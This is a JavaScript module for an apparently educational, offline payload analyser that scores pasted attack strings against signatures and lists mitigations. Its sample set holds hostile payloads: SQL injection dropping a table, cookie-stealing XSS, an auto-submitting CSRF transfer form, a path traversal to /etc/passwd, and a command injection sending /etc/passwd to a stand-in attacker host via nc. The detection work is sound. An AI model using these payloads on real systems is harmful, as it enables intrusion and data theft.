// crypt // sec-ops — threat-payload analyzer (real)
window.App = window.App || {};

App.threat = (() => {
  const { $, esc } = App.utils;
  let isLoaded = false;

  const SAMPLE = {
    "sql-injection":      "' OR '1'='1'; DROP TABLE users; --",
    "xss":                "<img src=x onerror=alert(document.cookie)>",
    "csrf":               "<form action='https://bank/transfer' method='post'><input type='hidden' name='to' value='attacker'><input type='hidden' name='amt' value='9999'></form><script>document.forms[0].submit()</script>",
    "directory-traversal":"../../../etc/passwd",
    "command-injection":  "127.0.0.1; cat /etc/passwd | nc attacker.tld 4444"
  };

  const score = (kind, payload) => {
    const sigs = App.data.threat_signatures[kind] || [];
    const matched = [];
    let total = 0;
    for (const s of sigs) {
      if (s.rx.test(payload)) {
        matched.push(s);
        total += s.weight;
      }
    }
    const verdict =
      total >= 60 ? 'critical' :
      total >= 35 ? 'high' :
      total >= 15 ? 'medium' :
      total > 0   ? 'low' : 'benign';
    return { matched, total, verdict, total_signals: sigs.length };
  };

  const load = () => {
    const view = $('#threat-view');
    if (!view || isLoaded) return;

    view.innerHTML = `
      <div class="view-headerline">
        <h1 class="view-title">// threat simulator</h1>
        <div class="view-meta">offline pattern scoring · educational only · no network calls</div>
      </div>

      <div class="tool">
        <div class="panel">
          <header class="panel-head">
            <span class="panel-tag">[ 01 ]</span>
            <h2>configure</h2>
            <span class="panel-state">offline</span>
          </header>
          <div class="field">
            <label class="field-label">attack class</label>
            <select class="select" id="th-kind">
              <option value="sql-injection">SQL injection</option>
              <option value="xss">cross-site scripting</option>
              <option value="csrf">cross-site request forgery</option>
              <option value="directory-traversal">directory traversal</option>
              <option value="command-injection">command injection</option>
            </select>
          </div>
          <div class="field">
            <label class="field-label">payload (yours or sample)</label>
            <textarea class="textarea code" id="th-payload" placeholder="paste a payload to evaluate" spellcheck="false"></textarea>
          </div>
          <div class="flex gap">
            <button class="brkbtn" id="th-sample">load sample</button>
            <button class="brkbtn primary" id="th-run">analyse</button>
          </div>
        </div>

        <div class="tool-stack">
          <div class="panel">
            <header class="panel-head">
              <span class="panel-tag">[ 02 ]</span>
              <h2>signature match</h2>
              <span class="panel-state" id="th-verdict">awaiting</span>
            </header>
            <div id="th-sig-result">
              <div class="result empty">// run analysis to see which signatures fire on your payload.</div>
            </div>
          </div>

          <div class="panel">
            <header class="panel-head">
              <span class="panel-tag">[ 03 ]</span>
              <h2>defensive guidance</h2>
              <span class="panel-state">checklist</span>
            </header>
            <ol id="th-mit" class="kv-list">
              <li class="muted">// load a payload to see mitigations.</li>
            </ol>
          </div>
        </div>
      </div>
    `;

    bind();
    isLoaded = true;
  };

  const bind = () => {
    $('#th-sample').addEventListener('click', () => {
      const k = $('#th-kind').value;
      $('#th-payload').value = SAMPLE[k];
    });
    $('#th-kind').addEventListener('change', () => {
      if (!$('#th-payload').value) $('#th-payload').value = SAMPLE[$('#th-kind').value];
    });
    $('#th-run').addEventListener('click', run);

    // preload first sample
    $('#th-payload').value = SAMPLE[$('#th-kind').value];
  };

  const run = () => {
    const kind = $('#th-kind').value;
    const payload = $('#th-payload').value;
    if (!payload.trim()) { App.ui.toast('threat', 'paste a payload first', 'warning'); return; }

    const r = score(kind, payload);
    const verdictColor = { critical: 'bad', high: 'bad', medium: 'warn', low: 'ok', benign: 'mute' }[r.verdict];

    $('#th-verdict').textContent = `${r.matched.length}/${r.total_signals} hits · ${r.verdict.toUpperCase()}`;

    const sigHtml = `
      <div class="kv-list">
        <div class="kv"><span class="kv-k">attack class</span><span class="kv-v">${kind}</span></div>
        <div class="kv"><span class="kv-k">verdict</span><span class="kv-v ${verdictColor}">${r.verdict.toUpperCase()}</span></div>
        <div class="kv"><span class="kv-k">aggregate score</span><span class="kv-v">${r.total} / ${r.total_signals * 30}</span></div>
        <div class="kv"><span class="kv-k">payload length</span><span class="kv-v">${payload.length} bytes</span></div>
      </div>
      <div style="height:10px"></div>
      <div class="muted" style="font-size:11px;letter-spacing:0.06em;text-transform:uppercase">signatures that fired</div>
      ${r.matched.length === 0
        ? '<div class="result empty" style="margin-top:8px">// none. payload would pass a basic signature filter — but content can still be malicious in context.</div>'
        : `<table class="data-table" style="margin-top:8px">
            <thead><tr><th>weight</th><th>signature</th></tr></thead>
            <tbody>${r.matched.map(s =>
              `<tr><td class="num"><span class="tag" style="color:var(--crimson)">+${s.weight}</span></td><td>${esc(s.label)}</td></tr>`
            ).join('')}</tbody>
          </table>`}
    `;
    $('#th-sig-result').innerHTML = sigHtml;

    const mits = App.data.threat_mitigations[kind] || [];
    $('#th-mit').innerHTML = mits.map(m => `
      <div class="kv"><span class="kv-k">▸</span><span class="kv-v">${esc(m)}</span></div>
    `).join('');

    App.log.event('threat',
      `analysed ${kind} payload — ${r.verdict.toUpperCase()} (${r.matched.length} sig hits)`,
      { severity: r.verdict === 'critical' || r.verdict === 'high' ? 'bad'
               : r.verdict === 'medium' ? 'warn'
               : r.verdict === 'low' ? 'info' : 'ok',
        meta: { kind, score: r.total, hits: r.matched.length } });
    App.dashboard?.refresh?.();
  };

  const init = () => {};
  return { init, load };
})();
